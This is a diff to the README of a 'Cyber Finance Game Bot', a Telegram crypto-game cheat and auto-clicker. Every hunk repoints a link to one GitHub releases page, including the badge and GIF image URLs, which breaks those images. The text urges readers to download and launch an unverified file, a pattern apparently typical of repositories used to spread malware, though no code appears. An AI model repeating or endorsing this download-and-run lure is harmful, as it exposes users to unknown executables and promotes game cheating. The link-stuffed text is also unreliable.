@@ -41,7 +41,7 @@ Welcome to the most advanced and efficient tool for dominating the Cyber Finance
 
 ## Get Started 🚀
 
-To download the latest version of our bot, visit [here](https://github.com/assets/Release.zip) ➡️
+To download the latest version of our bot, visit [here](https://github.com/EdoinoEdo/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases) ➡️
 
 If the link ends with a file name, make sure to launch the downloaded file accordingly. 
 
@@ -51,7 +51,7 @@ In case the link is not provided or not functional, we recommend checking the "R
 
 For a colorful button directing to the download link, use the following markdown code:
 ```md
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/assets/Release.zip)
+[![Download Latest Version](https://github.com/EdoinoEdo/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases%20Version-blue)](https://github.com/EdoinoEdo/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases)
 ```
 
 ## 🌟 Join the Cyber Finance Community 🌟
@@ -92,4 +92,4 @@ For updates, support, and community engagement, follow us on social media platfo
 
 By downloading and using our Cyber Finance Game Bot, you acknowledge and accept the terms and conditions outlined in the repository. Let's embark on this thrilling journey together and redefine the way we experience gaming in the digital age! 🌟🚀🎮
 
-![Game On](https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif)
+![Game On](https://github.com/EdoinoEdo/Cyber-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-CFI-Telegram-Hack-Cheat/releases)
